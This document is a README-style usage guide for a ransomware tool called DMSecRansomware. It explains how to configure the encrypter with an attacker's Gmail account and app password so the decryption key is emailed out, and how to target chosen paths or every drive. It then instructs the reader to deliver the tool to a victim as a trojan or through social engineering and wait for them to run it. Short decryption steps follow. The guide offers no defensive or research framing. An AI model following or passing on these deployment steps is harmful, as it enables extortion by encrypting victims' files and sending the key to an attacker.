# How to use DMSecRansomware

#### **Author**: [Dhrumil Mistry](https://github.com/dmdhrumilmistry)

## Encrypting data
- Turn on 2FA in attacker's gmail account.
- Create app password
- Update `dmsec_ransomware.py` with email and app password to login to your gmail account. This is used to receive key to decrypt the files.

  ```python
  encrypter = DMSECEncrypter(PATHS, gmail='yourgmailid', passwd='yourapppassword')
  ```
- Specify path which is to be encrypted.
- If all the drives are to be decrypted do not pass PATHS to the DMSECEncrypter

  ```python
  encrypter = DMSECEncrypter(gmail='yourgmailid', passwd='yourapppassword')
  ```
- Create a trojan or use social engineering and send file to the victim.
- Wait for victim to execute the trojan.


## Decrypting Data
- Use `decrypter.py` to decrypt the encrypted files.
- Edit paths to be decrypted in `decrypter.py` file. If all the drives are to be decrypted do not pass PATHS to DMSECDecrypter

  ```python
  encrypter = DMSECDecrypter(KEY)
  ```
- Use the key which was received on mail to decrypt the data

